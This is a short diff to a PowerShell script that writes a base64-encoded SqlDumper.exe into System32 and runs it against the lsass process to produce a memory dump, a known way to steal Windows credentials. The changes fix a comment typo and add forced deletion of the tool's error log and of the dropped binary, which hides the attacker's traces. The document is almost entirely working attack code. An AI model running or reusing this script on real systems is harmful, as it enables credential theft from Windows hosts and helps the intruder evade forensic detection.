@@ -14,10 +14,11 @@
 $BlobSqlDumper = "<add base64 string here>"
 $PathSqlDumper = "$env:SystemRoot\System32\SqlDumper.exe"
 
-# Deploy SqlDumber and run it
+# Deploy SqlDumper and run it
 $ProcessId = $(Get-Process -Name lsass).Id
 cd "$env:SystemRoot\System32"
 [IO.File]::WriteAllBytes($PathSqlDumper, [Convert]::FromBase64String($BlobSqlDumper))
 &$PathSqlDumper $ProcessId 0 0x0110:40 
 
-Remove-Item "$env:SystemRoot\System32\SQLDUMPER_ERRORLOG.log"
+Remove-Item -Force "$env:SystemRoot\System32\SQLDUMPER_ERRORLOG.log"
+Remove-Item -Force $PathSqlDumper
